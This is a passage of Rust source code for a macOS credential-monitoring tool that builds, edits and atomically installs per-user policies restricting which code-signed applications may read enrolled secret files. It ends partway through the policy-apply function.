// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
// Copyright (c) 2026 QKey Co. Source-available, not open source; commercial use requires a licence. See NOTICE.md.
//! Credential monitoring — protected credential management and access detection.
//!
//! CLI: `gorse canary create|list|alerts|remove`

use rand::Rng;
use serde::{Deserialize, Serialize};
use std::io::Write;
use std::path::{Path, PathBuf};

pub const REGISTRY_VERSION: u32 = 2;
pub const SELFTEST_ENV_NAME: &str = "HEDGEHOG_SELFTEST_DECOY";

/// Reviewed, root-installed access policy. Plans contain metadata, never secret bytes.
pub mod secret_policy {
    use serde::{Deserialize, Serialize};
    use serde_json::{json, Value};
    use sha2::{Digest, Sha256};
    use std::collections::HashSet;
    use std::path::{Path, PathBuf};

    pub const POLICY_DIRECTORY: &str = "/Library/Application Support/Hedgehog/secret-policies";
    pub const MAX_POLICY_BYTES: usize = 1024 * 1024;
    pub const MAX_SECRETS: usize = 256;
    pub const MAX_READERS: usize = 16;

    #[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
    #[serde(deny_unknown_fields)]
    pub struct Reader {
        pub cdhash: String,
        pub signing_id: String,
        pub team_id: String,
        pub platform_binary: bool,
    }
    #[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
    #[serde(deny_unknown_fields)]
    pub struct Secret {
        pub id: String,
        pub path: String,
        pub device: u64,
        pub inode: u64,
        pub readers: Vec<Reader>,
    }
    #[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
    #[serde(deny_unknown_fields)]
    pub struct Policy {
        pub schema: u32,
        pub owner_uid: u32,
        pub revision: String,
        pub base_policy_sha256: Option<String>,
        pub secrets: Vec<Secret>,
    }
    #[derive(Clone, Debug)]
    pub struct LoadedPolicy {
        pub policy: Policy,
        pub sha256: String,
    }

    #[derive(clap::Subcommand)]
    pub enum SecretCommand {
        /// Create a private enrollment draft; existing policy is merged by default
        Plan {
            #[arg(long)]
            scan_root: Option<PathBuf>,
            #[arg(long)]
            secret: Vec<PathBuf>,
            /// Continue an unapplied private draft
            #[arg(long)]
            policy: Option<PathBuf>,
            #[arg(long)]
            output: PathBuf,
            #[arg(long)]
            json: bool,
        },
        /// Add exact verified application code identities to a private draft
        Approve {
            #[arg(long)]
            policy: PathBuf,
            #[arg(long)]
            secret_id: String,
            #[arg(long)]
            application: PathBuf,
            #[arg(long)]
            output: PathBuf,
            #[arg(long)]
            json: bool,
        },
        /// Remove one approved code hash from a private draft
        Revoke {
            #[arg(long)]
            policy: PathBuf,
            #[arg(long)]
            secret_id: String,
            #[arg(long)]
            reader_cdhash: String,
            #[arg(long)]
            output: PathBuf,
            #[arg(long)]
            json: bool,
        },
        /// Remove one enrolled file from a private draft
        Forget {
            #[arg(long)]
            policy: PathBuf,
            #[arg(long)]
            secret_id: String,
            #[arg(long)]
            output: PathBuf,
            #[arg(long)]
            json: bool,
        },
        /// Atomically install the exact reviewed draft (administrator only)
        Apply {
            #[arg(long)]
            policy: PathBuf,
            #[arg(long)]
            sha256: String,
            #[arg(long)]
            owner_uid: u32,
            #[arg(long)]
            json: bool,
        },
        /// Show this user's policy and observed sensor/monitor metadata
        Status {
            #[arg(long)]
            json: bool,
        },
    }

    fn hex(value: &str, length: usize) -> bool {
        value.len() == length
            && value
                .bytes()
                .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
    }
    fn text(value: &str, limit: usize) -> bool {
        value.len() <= limit && !value.chars().any(char::is_control)
    }
    pub fn validate_policy(policy: &Policy) -> Result<(), String> {
        if policy.schema != 1
            || !hex(&policy.revision, 32)
            || policy.secrets.len() > MAX_SECRETS
            || policy
                .base_policy_sha256
                .as_ref()
                .is_some_and(|hash| !hex(hash, 64))
        {
            return Err("Invalid policy schema, revision, base hash or enrollment limit".into());
        }
        let mut ids = HashSet::new();
        let mut paths = HashSet::new();
        let mut identities = HashSet::new();
        for secret in &policy.secrets {
            // Enrolled paths are macOS sensor paths, so they are POSIX
            // absolute paths on every host that reads a policy. `Path::is_absolute`
            // would reject them on Windows and accept drive-letter paths the
            // sensor can never produce.
            if !hex(&secret.id, 32)
                || !ids.insert(&secret.id)
                || !paths.insert(&secret.path)
                || !identities.insert((secret.device, secret.inode))
                || secret.inode == 0
                || !secret.path.starts_with('/')
                || !text(&secret.path, 4096)
                || secret.path.ends_with('/')
                || secret
                    .path
                    .split('/')
                    .skip(1)
                    .any(|part| part.is_empty() || part == "." || part == "..")
                || secret.readers.len() > MAX_READERS
            {
                return Err("Invalid, duplicated or unsupported secret enrollment".into());
            }
            let mut readers = HashSet::new();
            for reader in &secret.readers {
                if !hex(&reader.cdhash, 40)
                    || reader.cdhash.bytes().all(|byte| byte == b'0')
                    || !readers.insert(&reader.cdhash)
                    || reader.signing_id.is_empty()
                    || !text(&reader.signing_id, 512)
                    || !text(&reader.team_id, 64)
                    || (!reader.platform_binary && reader.team_id.is_empty())
                    || !reader
                        .team_id
                        .bytes()
                        .all(|byte| byte.is_ascii_alphanumeric())
                {
                    return Err(
                        "Reader approval requires an exact code hash and bounded signing identity"
                            .into(),
                    );
                }
            }
        }
        Ok(())
    }
    pub fn decode_policy(bytes: &[u8]) -> Result<LoadedPolicy, String> {
        if bytes.is_empty() || bytes.len() > MAX_POLICY_BYTES {
            return Err("Policy exceeds the bounded input size".into());
        }
        // Option normally accepts a missing field: require the concurrency base explicitly.
        let document: Value = serde_json::from_slice(bytes).map_err(|_| "Invalid policy JSON")?;
        if document.get("base_policy_sha256").is_none() {
            return Err("Policy must explicitly declare its base hash".into());
        }
        let policy: Policy = serde_json::from_slice(bytes)
            .map_err(|_| "Policy fields are missing, duplicated, unknown or invalid")?;
        validate_policy(&policy)?;
        Ok(LoadedPolicy {
            policy,
            sha256: format!("{:x}", Sha256::digest(bytes)),
        })
    }

    #[cfg(unix)]
    mod custody {
        use super::*;
        use std::ffi::CString;
        use std::fs::File;
        use std::io::{Read, Write};
        use std::os::fd::{AsRawFd, FromRawFd};
        use std::os::unix::fs::MetadataExt;

        fn component(value: &std::ffi::OsStr) -> Result<CString, String> {
            use std::os::unix::ffi::OsStrExt;
            CString::new(value.as_bytes()).map_err(|_| "Path contains a null byte".into())
        }
        pub fn directory(path: &Path, root_only: bool, create: bool) -> Result<File, String> {
            if !path.is_absolute() {
                return Err("Expected an absolute directory".into());
            }
            let fd = unsafe {
                libc::open(
                    c"/".as_ptr(),
                    libc::O_RDONLY | libc::O_DIRECTORY | libc::O_CLOEXEC,
                )
            };
            if fd < 0 {
                return Err("Cannot open directory root".into());
            }
            let mut current = unsafe { File::from_raw_fd(fd) };
            for part in path.components().skip(1) {
                let std::path::Component::Normal(part) = part else {
                    return Err("Directory traversal is unsupported".into());
                };
                let name = component(part)?;
                let mut created = false;
                if create {
                    let result =
                        unsafe { libc::mkdirat(current.as_raw_fd(), name.as_ptr(), 0o755) };
                    created = result == 0;
                    if result != 0
                        && std::io::Error::last_os_error().kind()
                            != std::io::ErrorKind::AlreadyExists
                    {
                        return Err("Cannot create protected policy directory".into());
                    }
                }
                let fd = unsafe {
                    libc::openat(
                        current.as_raw_fd(),
                        name.as_ptr(),
                        libc::O_RDONLY | libc::O_DIRECTORY | libc::O_NOFOLLOW | libc::O_CLOEXEC,
                    )
                };
                if fd < 0 {
                    return Err("Directory is missing, unreadable or uses a symbolic link".into());
                }
                current = unsafe { File::from_raw_fd(fd) };
                if created && unsafe { libc::fchmod(current.as_raw_fd(), 0o755) } != 0 {
                    return Err("Cannot set policy directory permissions".into());
                }
                let meta = current
                    .metadata()
                    .map_err(|_| "Cannot inspect directory ownership")?;
                if root_only && (meta.uid() != 0 || meta.mode() & 0o022 != 0) {
                    return Err(
                        "Policy directory must be root-owned and nonwritable by other users".into(),
                    );
                }
            }
            Ok(current)
        }
        fn parent(path: &Path) -> Result<(File, CString, PathBuf), String> {
            let absolute = if path.is_absolute() {
                path.to_path_buf()
            } else {
                std::env::current_dir()
                    .map_err(|_| "Cannot resolve working directory")?
                    .join(path)
            };
            let name = component(absolute.file_name().ok_or("Expected a file path")?)?;
            // Resolve user-facing directory aliases once, then hold every canonical component.
            let canonical_parent = absolute
                .parent()
                .ok_or("Missing parent directory")?
                .canonicalize()
                .map_err(|_| "Cannot resolve input parent directory")?;
            let parent = directory(&canonical_parent, false, false)?;
            let canonical = canonical_parent.join(absolute.file_name().unwrap());
            Ok((parent, name, canonical))
        }
        pub fn open_regular(path: &Path) -> Result<(File, PathBuf), String> {
            open_regular_flags(path, libc::O_RDONLY)
        }
        fn open_regular_flags(path: &Path, access: i32) -> Result<(File, PathBuf), String> {
            let (parent, name, canonical) = parent(path)?;
            let fd = unsafe {
                libc::openat(
                    parent.as_raw_fd(),
                    name.as_ptr(),
                    access | libc::O_NOFOLLOW | libc::O_NONBLOCK | libc::O_CLOEXEC,
                )
            };
            if fd < 0 {
                return Err("File is missing, unreadable or uses a symbolic link".into());
            }
            let file = unsafe { File::from_raw_fd(fd) };
            let meta = file.metadata().map_err(|_| "Cannot inspect file")?;
            if !meta.is_file() {
                return Err("A regular file is required".into());
            }
            Ok((file, canonical))
        }
        fn read_bounded(mut file: File, owner: u32, mode: u32) -> Result<Vec<u8>, String> {
            let before = file.metadata().map_err(|_| "Cannot inspect policy input")?;
            if !before.is_file()
                || before.uid() != owner
                || before.nlink() != 1
                || before.mode() & 0o777 != mode
                || before.len() == 0
                || before.len() > MAX_POLICY_BYTES as u64
            {
                return Err(
                    "Policy input ownership, permissions, link count or size is unsafe".into(),
                );
            }
            let mut bytes = Vec::new();
            Read::by_ref(&mut file)
                .take(MAX_POLICY_BYTES as u64 + 1)
                .read_to_end(&mut bytes)
                .map_err(|_| "Cannot read bounded policy input")?;
            let after = file.metadata().map_err(|_| "Cannot recheck policy input")?;
            if bytes.len() != before.len() as usize
                || before.len() != after.len()
                || before.mtime() != after.mtime()
                || before.mtime_nsec() != after.mtime_nsec()
                || before.ctime() != after.ctime()
                || before.ctime_nsec() != after.ctime_nsec()
            {
                return Err("Policy input changed while being read".into());
            }
            Ok(bytes)
        }
        pub fn capture_private(path: &Path, owner: u32) -> Result<Vec<u8>, String> {
            let (file, _) = open_regular(path)?;
            read_bounded(file, owner, 0o600)
        }
        pub fn private(path: &Path, owner: u32) -> Result<LoadedPolicy, String> {
            let loaded = decode_policy(&capture_private(path, owner)?)?;
            if loaded.policy.owner_uid != owner {
                return Err("Policy belongs to a different user".into());
            }
            Ok(loaded)
        }
        pub fn installed_at(parent: &File, uid: u32) -> Result<Option<LoadedPolicy>, String> {
            let name = CString::new(format!("{uid}.json")).unwrap();
            let fd = unsafe {
                libc::openat(
                    parent.as_raw_fd(),
                    name.as_ptr(),
                    libc::O_RDONLY | libc::O_NOFOLLOW | libc::O_NONBLOCK | libc::O_CLOEXEC,
                )
            };
            if fd < 0 {
                if std::io::Error::last_os_error().kind() == std::io::ErrorKind::NotFound {
                    return Ok(None);
                }
                return Err("Installed policy is unreadable or untrusted".into());
            }
            let loaded = decode_policy(&read_bounded(unsafe { File::from_raw_fd(fd) }, 0, 0o644)?)?;
            if loaded.policy.owner_uid != uid {
                return Err("Installed policy owner does not match its filename".into());
            }
            Ok(Some(loaded))
        }
        pub fn secret(path: &Path, uid: u32) -> Result<(String, u64, u64), String> {
            // Enrollment/apply need vnode metadata, not read access. O_EVTONLY
            // avoids manufacturing a secret-read alarm while checking policy.
            #[cfg(target_os = "macos")]
            let access = libc::O_EVTONLY;
            #[cfg(not(target_os = "macos"))]
            let access = libc::O_RDONLY;
            let (file, canonical) = open_regular_flags(path, access)?;
            let meta = file
                .metadata()
                .map_err(|_| "Cannot inspect enrolled file")?;
            if meta.uid() != uid || meta.nlink() != 1 {
                return Err("Only files owned by the policy owner without hard-link aliases can be enrolled".into());
            }
            let canonical = canonical
                .canonicalize()
                .map_err(|_| "Cannot resolve canonical secret path")?;
            let (claimed, claimed_path) = open_regular_flags(&canonical, access)?;
            let claimed_meta = claimed
                .metadata()
                .map_err(|_| "Cannot inspect claimed secret path")?;
            let after = file
                .metadata()
                .map_err(|_| "Cannot recheck enrolled file")?;
            if claimed_path != canonical
                || [claimed_meta, after].iter().any(|value| {
                    value.dev() != meta.dev()
                        || value.ino() != meta.ino()
                        || value.uid() != uid
                        || value.nlink() != 1
                        || value.len() != meta.len()
                        || value.mtime() != meta.mtime()
                        || value.mtime_nsec() != meta.mtime_nsec()
                        || value.ctime() != meta.ctime()
                        || value.ctime_nsec() != meta.ctime_nsec()
                })
            {
                return Err("Secret path or file identity changed during enrollment".into());
            }
            let path = canonical
                .to_str()
                .ok_or("Secret paths must be UTF-8")?
                .to_string();
            if !text(&path, 4096) {
                return Err("Secret path contains unsupported characters".into());
            }
            Ok((path, meta.dev(), meta.ino()))
        }
        pub fn write_new(path: &Path, bytes: &[u8], uid: u32) -> Result<PathBuf, String> {
            let (parent, name, canonical) = parent(path)?;
            let meta = parent
                .metadata()
                .map_err(|_| "Cannot inspect output directory")?;
            if meta.uid() != uid || meta.mode() & 0o022 != 0 {
                return Err(
                    "Output directory must belong to the current user and be nonwritable by others"
                        .into(),
                );
            }
            let fd = unsafe {
                libc::openat(
                    parent.as_raw_fd(),
                    name.as_ptr(),
                    libc::O_WRONLY
                        | libc::O_CREAT
                        | libc::O_EXCL
                        | libc::O_NOFOLLOW
                        | libc::O_CLOEXEC,
                    0o600,
                )
            };
            if fd < 0 {
                return Err(
                    "Cannot create private plan; existing outputs are never overwritten".into(),
                );
            }
            let mut file = unsafe { File::from_raw_fd(fd) };
            if unsafe { libc::fchmod(file.as_raw_fd(), 0o600) } != 0 {
                unsafe {
                    libc::unlinkat(parent.as_raw_fd(), name.as_ptr(), 0);
                }
                return Err("Cannot set private plan permissions".into());
            }
            if file.write_all(bytes).and_then(|_| file.sync_all()).is_err() {
                unsafe {
                    libc::unlinkat(parent.as_raw_fd(), name.as_ptr(), 0);
                }
                return Err("Cannot persist private plan".into());
            }
            Ok(canonical)
        }
        pub fn install(loaded: &LoadedPolicy, bytes: &[u8]) -> Result<(), String> {
            let parent = directory(Path::new(POLICY_DIRECTORY), true, true)?;
            let lock_name = CString::new(format!(".{}.lock", loaded.policy.owner_uid)).unwrap();
            let fd = unsafe {
                libc::openat(
                    parent.as_raw_fd(),
                    lock_name.as_ptr(),
                    libc::O_RDWR | libc::O_CREAT | libc::O_NOFOLLOW | libc::O_CLOEXEC,
                    0o600,
                )
            };
            if fd < 0 {
                return Err("Cannot acquire policy installation lock".into());
            }
            let lock = unsafe { File::from_raw_fd(fd) };
            let meta = lock.metadata().map_err(|_| "Cannot inspect policy lock")?;
            if !meta.is_file()
                || meta.uid() != 0
                || meta.nlink() != 1
                || meta.mode() & 0o077 != 0
                || unsafe { libc::flock(lock.as_raw_fd(), libc::LOCK_EX | libc::LOCK_NB) } != 0
            {
                return Err("Policy installation is busy or its lock is untrusted".into());
            }
            let existing = installed_at(&parent, loaded.policy.owner_uid)?;
            check_base(&loaded.policy, existing.as_ref())?;
            let temporary = CString::new(format!(
                ".{}.{}.tmp",
                loaded.policy.owner_uid,
                super::super::random_hex(32)
            ))
            .unwrap();
            let fd = unsafe {
                libc::openat(
                    parent.as_raw_fd(),
                    temporary.as_ptr(),
                    libc::O_WRONLY
                        | libc::O_CREAT
                        | libc::O_EXCL
                        | libc::O_NOFOLLOW
                        | libc::O_CLOEXEC,
                    0o600,
                )
            };
            if fd < 0 {
                return Err("Cannot create protected policy staging file".into());
            }
            let mut file = unsafe { File::from_raw_fd(fd) };
            let destination = CString::new(format!("{}.json", loaded.policy.owner_uid)).unwrap();
            let result = (|| {
                file.write_all(bytes)
                    .map_err(|_| "Cannot write protected policy")?;
                if unsafe { libc::fchmod(file.as_raw_fd(), 0o644) } != 0 {
                    return Err("Cannot set protected policy permissions".to_string());
                }
                file.sync_all()
                    .map_err(|_| "Cannot sync protected policy")?;
                if unsafe {
                    libc::renameat(
                        parent.as_raw_fd(),
                        temporary.as_ptr(),
                        parent.as_raw_fd(),
                        destination.as_ptr(),
                    )
                } != 0
                {
                    return Err("Cannot atomically install protected policy".into());
                }
                parent
                    .sync_all()
                    .map_err(|_| "Policy installed but directory sync failed".to_string())
            })();
            if result.is_err() {
                unsafe {
                    libc::unlinkat(parent.as_raw_fd(), temporary.as_ptr(), 0);
                }
            }
            result
        }
    }

    pub fn check_base(policy: &Policy, existing: Option<&LoadedPolicy>) -> Result<(), String> {
        if policy.base_policy_sha256.as_deref() != existing.map(|value| value.sha256.as_str())
            || existing.is_some_and(|value| {
                value.policy.revision == policy.revision
                    || value.policy.owner_uid != policy.owner_uid
            })
        {
            return Err("Installed policy changed or revision was reused; start a fresh plan and review again".into());
        }
        Ok(())
    }
    fn require_macos() -> Result<(), String> {
        if cfg!(target_os = "macos") {
            Ok(())
        } else {
            Err("Local secret policy operations require macOS and its installed sensor".into())
        }
    }
    fn current_uid() -> Result<u32, String> {
        require_macos()?;
        #[cfg(unix)]
        {
            Ok(unsafe { libc::geteuid() })
        }
        #[cfg(not(unix))]
        {
            Err("Local secret policy operations require macOS".into())
        }
    }
    pub fn load_current() -> Result<Option<LoadedPolicy>, String> {
        load_for_uid(current_uid()?)
    }
    pub fn load_for_uid(uid: u32) -> Result<Option<LoadedPolicy>, String> {
        require_macos()?;
        #[cfg(unix)]
        {
            // Distinguish an absent initial deployment from malformed installed state.
            match std::fs::symlink_metadata(POLICY_DIRECTORY) {
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                    for parent in Path::new(POLICY_DIRECTORY).ancestors().skip(1) {
                        match std::fs::symlink_metadata(parent) {
                            Ok(_) => {
                                custody::directory(parent, true, false)?;
                                break;
                            }
                            Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
                            Err(_) => {
                                return Err(
                                    "Cannot establish installed policy directory trust".into()
                                )
                            }
                        }
                    }
                    Ok(None)
                }
                Err(_) => Err("Cannot inspect installed policy directory".into()),
                Ok(_) => custody::installed_at(
                    &custody::directory(Path::new(POLICY_DIRECTORY), true, false)?,
                    uid,
                ),
            }
        }
        #[cfg(not(unix))]
        {
            let _ = uid;
            Err("Local secret policy operations require macOS".into())
        }
    }
    fn save(policy: &Policy, output: &Path) -> Result<Value, String> {
        validate_policy(policy)?;
        let mut bytes = serde_json::to_vec_pretty(policy).map_err(|_| "Cannot serialize policy")?;
        bytes.push(b'\n');
        if bytes.len() > MAX_POLICY_BYTES {
            return Err("Policy exceeds 1 MiB".into());
        }
        #[cfg(unix)]
        {
            let path = custody::write_new(output, &bytes, current_uid()?)?;
            Ok(
                json!({"schema":1,"owner_uid":policy.owner_uid,"policy_path":path,
                "policy_sha256":format!("{:x}",Sha256::digest(&bytes)),"policy":policy}),
            )
        }
        #[cfg(not(unix))]
        {
            let _ = (output, bytes);
            Err("Local secret policy operations require macOS".into())
        }
    }

    /// Every file a scan says to protect: files with a visible finding and
    /// files that carry a government classification marking. The marking
    /// findings are silent (never shown, serialised or uploaded), but the
    /// guard must still protect the file. Only the path is used; the file is
    /// never quoted, moved or deleted.
    #[cfg_attr(not(unix), allow(dead_code))]
    pub(crate) fn protected_paths(report: crate::content_scanner::ScanReport) -> Vec<PathBuf> {
        let mut seen = HashSet::new();
        report
            .results
            .into_iter()
            .map(|result| result.path)
            .chain(report.silent_paths)
            .filter(|path| seen.insert(path.clone()))
            .collect()
    }

    pub fn plan(
        scan_root: Option<&Path>,
        secrets: &[PathBuf],
        base: Option<&Path>,
        output: &Path,
    ) -> Result<Value, String> {
        let uid = current_uid()?;
        if scan_root.is_some() == !secrets.is_empty() || secrets.len() > MAX_SECRETS {
            return Err("Choose one scan root or one to 256 explicit secret files".into());
        }
        #[cfg(unix)]
        {
            let mut policy = if let Some(path) = base {
                custody::private(path, uid)?.policy
            } else if let Some(installed) = load_for_uid(uid)? {
                Policy {
                    base_policy_sha256: Some(installed.sha256),
                    ..installed.policy
                }
            } else {
                Policy {
                    schema: 1,
                    owner_uid: uid,
                    revision: super::random_hex(32),
                    base_policy_sha256: None,
                    secrets: Vec::new(),
                }
            };
            let paths = if let Some(root) = scan_root {
                use std::sync::{atomic::AtomicBool, Arc};
                let report = crate::content_scanner::scan_directory_checked(
                    root,
                    &crate::content_scanner::ScanConfig::default(),
                    &Arc::new(AtomicBool::new(false)),
                    None,
                );
                if !report.complete {
                    return Err(format!("Scan coverage is incomplete ({} errors, {} skipped); select readable files explicitly or fix the scan root", report.error_count, report.skipped_count));
                }
                protected_paths(report)
            } else {
                secrets.to_vec()
            };
            for path in paths {
                let (path, device, inode) = custody::secret(&path, uid)?;
                if let Some(existing) = policy.secrets.iter_mut().find(|secret| secret.path == path)
                {
                    if existing.device != device || existing.inode != inode {
                        existing.id = super::random_hex(32);
                        existing.device = device;
                        existing.inode = inode;
                        existing.readers.clear();
                    }
                } else {
                    policy.secrets.push(Secret {
                        id: super::random_hex(32),
                        path,
                        device,
                        inode,
                        readers: Vec::new(),
                    });
                }
                if policy.secrets.len() > MAX_SECRETS {
                    return Err("Policy exceeds 256 enrolled files".into());
                }
            }
            policy.revision = super::random_hex(32);
            policy.secrets.sort_by(|a, b| a.path.cmp(&b.path));
            save(&policy, output)
        }
        #[cfg(not(unix))]
        {
            let _ = (base, output, uid);
            Err("Local secret policy operations require macOS".into())
        }
    }

    #[cfg(target_os = "macos")]
    fn run_tool(
        tool: &str,
        arguments: &[&std::ffi::OsStr],
    ) -> Result<(bool, String, String), String> {
        use std::io::Read;
        use std::os::fd::AsRawFd;
        use std::process::{Command, Stdio};
        use std::time::{Duration, Instant};
        let mut child = Command::new(tool)
            .args(arguments)
            .env_clear()
            .env("PATH", "/usr/bin:/bin:/usr/sbin:/sbin")
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|_| "Cannot run local code-signature verifier")?;
        let deadline = Instant::now() + Duration::from_secs(15);
        fn capture<R: Read + AsRawFd + Send + 'static>(
            mut input: R,
            deadline: Instant,
        ) -> std::thread::JoinHandle<Result<Vec<u8>, String>> {
            std::thread::spawn(move || {
                let flags = unsafe { libc::fcntl(input.as_raw_fd(), libc::F_GETFL) };
                if flags < 0
                    || unsafe {
                        libc::fcntl(input.as_raw_fd(), libc::F_SETFL, flags | libc::O_NONBLOCK)
                    } < 0
                {
                    return Err("Cannot bound verifier output".into());
                }
                let mut bytes = Vec::new();
                let mut buffer = [0u8; 4096];
                loop {
                    if Instant::now() >= deadline {
                        return Err("Verifier output timed out".into());
                    }
                    match input.read(&mut buffer) {
                        Ok(0) => return Ok(bytes),
                        Ok(count) => {
                            bytes.extend_from_slice(&buffer[..count]);
                            if bytes.len() > 65536 {
                                return Err("Verifier output exceeded its bound".into());
                            }
                        }
                        Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                            std::thread::sleep(Duration::from_millis(5))
                        }
                        Err(error) if error.kind() == std::io::ErrorKind::Interrupted => continue,
                        Err(_) => return Err("Cannot read verifier output".into()),
                    }
                }
            })
        }
        let out = capture(child.stdout.take().unwrap(), deadline);
        let err = capture(child.stderr.take().unwrap(), deadline);
        let status = loop {
            match child.try_wait() {
                Ok(Some(status)) => break Some(status),
                Ok(None) if Instant::now() < deadline => {
                    std::thread::sleep(Duration::from_millis(10))
                }
                _ => {
                    let _ = child.kill();
                    let _ = child.wait();
                    break None;
                }
            }
        };
        let out = out
            .join()
            .map_err(|_| "Verifier output failed")?
            .map_err(|_| "Verifier output failed")?;
        let err = err
            .join()
            .map_err(|_| "Verifier output failed")?
            .map_err(|_| "Verifier output failed")?;
        if out.len() > 65536 || err.len() > 65536 || status.is_none() {
            return Err("Code verification exceeded its output/time limit".into());
        }
        Ok((
            status.unwrap().success(),
            String::from_utf8(out).map_err(|_| "Invalid verifier output")?,
            String::from_utf8(err).map_err(|_| "Invalid verifier output")?,
        ))
    }
    pub fn parse_reader_metadata(
        metadata: &str,
        apple_anchor_verified: bool,
    ) -> Result<Reader, String> {
        let field = |prefix: &str| -> Result<&str, String> {
            let values: Vec<_> = metadata
                .lines()
                .filter_map(|line| line.strip_prefix(prefix))
                .collect();
            if values.len() != 1 {
                return Err("Code identity metadata is missing or ambiguous".into());
            }
            Ok(values[0])
        };
        if metadata.lines().any(|line| {
            line == "Signature=adhoc"
                || (line.starts_with("CodeDirectory ") && line.contains("adhoc"))
        }) {
            return Err("Unsigned and ad-hoc applications cannot receive reader approval".into());
        }
        let signature = field("Signature size=")?
            .parse::<u64>()
            .map_err(|_| "Missing code signature")?;
        if signature == 0 {
            return Err("Missing code signature".into());
        }
        let platform = metadata
            .lines()
            .find_map(|line| line.strip_prefix("Platform identifier="));
        let platform_binary = match platform {
            Some(value) => {
                value
                    .parse::<u8>()
                    .map_err(|_| "Invalid platform signature marker")?
                    > 0
            }
            None => false,
        };
        if platform_binary && !apple_anchor_verified {
            return Err("Platform marker is not endorsed by an Apple code-signing anchor".into());
        }
        let team = field("TeamIdentifier=")?;
        let reader = Reader {
            cdhash: field("CDHash=")?.to_lowercase(),
            signing_id: field("Identifier=")?.into(),
            team_id: if team == "not set" {
                String::new()
            } else {
                team.into()
            },
            platform_binary,
        };
        let policy = Policy {
            schema: 1,
            owner_uid: 0,
            revision: "1".repeat(32),
            base_policy_sha256: None,
            secrets: vec![Secret {
                id: "2".repeat(32),
                path: "/synthetic".into(),
                device: 1,
                inode: 1,
                readers: vec![reader.clone()],
            }],
        };
        validate_policy(&policy)?;
        Ok(reader)
    }
    pub fn application_readers(application: &Path) -> Result<Vec<Reader>, String> {
        require_macos()?;
        #[cfg(target_os = "macos")]
        {
            use std::ffi::OsStr;
            use std::os::unix::fs::MetadataExt;
            let target = application
                .canonicalize()
                .map_err(|_| "Application is missing or cannot be resolved")?;
            let verify = || {
                run_tool(
                    "/usr/bin/codesign",
                    &[
                        OsStr::new("--verify"),
                        OsStr::new("--strict"),
                        OsStr::new("--all-architectures"),
                        target.as_os_str(),
                    ],
                )
            };
            if !verify()?.0 {
                return Err("Application code signature verification failed".into());
            }
            let (_, _, initial) = run_tool(
                "/usr/bin/codesign",
                &[
                    OsStr::new("-d"),
                    OsStr::new("--verbose=4"),
                    target.as_os_str(),
                ],
            )?;
            let executable = initial
                .lines()
                .find_map(|line| line.strip_prefix("Executable="))
                .ok_or("Cannot identify application executable")?;
            let (file, _) = custody::open_regular(Path::new(executable))?;
            let before = file
                .metadata()
                .map_err(|_| "Cannot inspect application executable")?;
            if before.len() > 256 * 1024 * 1024 {
                return Err("Application executable exceeds approval size limit".into());
            }
            let (ok, architectures, _) = run_tool(
                "/usr/bin/lipo",
                &[OsStr::new("-archs"), OsStr::new(executable)],
            )?;
            let architectures: Vec<_> = architectures.split_whitespace().collect();
            if !ok
                || architectures.is_empty()
                || architectures.len() > 4
                || architectures
                    .iter()
                    .any(|arch| !["arm64", "arm64e", "x86_64", "x86_64h"].contains(arch))
            {
                return Err("Unsupported application architectures".into());
            }
            let apple = run_tool(
                "/usr/bin/codesign",
                &[
                    OsStr::new("--verify"),
                    OsStr::new("--strict"),
                    OsStr::new("--all-architectures"),
                    OsStr::new("-R=anchor apple"),
                    target.as_os_str(),
                ],
            )?
            .0;
            let mut readers = Vec::new();
            for architecture in architectures {
                let (ok, _, metadata) = run_tool(
                    "/usr/bin/codesign",
                    &[
                        OsStr::new("-d"),
                        OsStr::new("--verbose=4"),
                        OsStr::new("--arch"),
                        OsStr::new(architecture),
                        target.as_os_str(),
                    ],
                )?;
                if !ok {
                    return Err("Cannot inspect each signed application architecture".into());
                }
                let reader = parse_reader_metadata(&metadata, apple)?;
                if !readers.contains(&reader) {
                    readers.push(reader);
                }
            }
            let (after_file, _) = custody::open_regular(Path::new(executable))?;
            let after = after_file
                .metadata()
                .map_err(|_| "Cannot recheck application executable")?;
            if !verify()?.0
                || before.dev() != after.dev()
                || before.ino() != after.ino()
                || before.len() != after.len()
                || before.mtime() != after.mtime()
                || before.mtime_nsec() != after.mtime_nsec()
                || before.ctime() != after.ctime()
                || before.ctime_nsec() != after.ctime_nsec()
            {
                return Err("Application changed during approval".into());
            }
            Ok(readers)
        }
        #[cfg(not(target_os = "macos"))]
        {
            let _ = application;
            Err("Application approval requires macOS code signing".into())
        }
    }

    fn edit(
        policy_path: &Path,
        secret_id: &str,
        application: Option<&Path>,
        revoke: Option<&str>,
        output: &Path,
    ) -> Result<Value, String> {
        let uid = current_uid()?;
        #[cfg(unix)]
        {
            let mut policy = custody::private(policy_path, uid)?.policy;
            let index = policy
                .secrets
                .iter()
                .position(|secret| secret.id == secret_id)
                .ok_or("Secret ID is not present in this policy")?;
            if let Some(application) = application {
                let readers = application_readers(application)?;
                for reader in readers {
                    if !policy.secrets[index].readers.contains(&reader) {
                        policy.secrets[index].readers.push(reader);
                    }
                }
            } else if let Some(cdhash) = revoke {
                if !hex(cdhash, 40)
                    || !policy.secrets[index]
                        .readers
                        .iter()
                        .any(|reader| reader.cdhash == cdhash)
                {
                    return Err("Reader code hash is not present for this secret".into());
                }
                policy.secrets[index]
                    .readers
                    .retain(|reader| reader.cdhash != cdhash);
            } else {
                policy.secrets.remove(index);
            }
            policy.revision = super::random_hex(32);
            let mut result = save(&policy, output)?;
            if application.is_some() {
                result["reader_qualification"]=json!("Code signature verified; approval still requires valid, signed, unmodified runtime identity with HARD or KILL page enforcement. No matching runtime access has been observed by this command.");
            }
            Ok(result)
        }
        #[cfg(not(unix))]
        {
            let _ = (policy_path, secret_id, application, revoke, output, uid);
            Err("Local secret policy operations require macOS".into())
        }
    }
    pub fn apply(path: &Path, expected_sha256: &str, uid: u32) -> Result<Value, String> {
        require_macos()?;
        #[cfg(unix)]
        {
            if unsafe { libc::geteuid() } != 0 {
                return Err(
                    "Applying a reviewed secret policy requires administrator authorization".into(),
                );
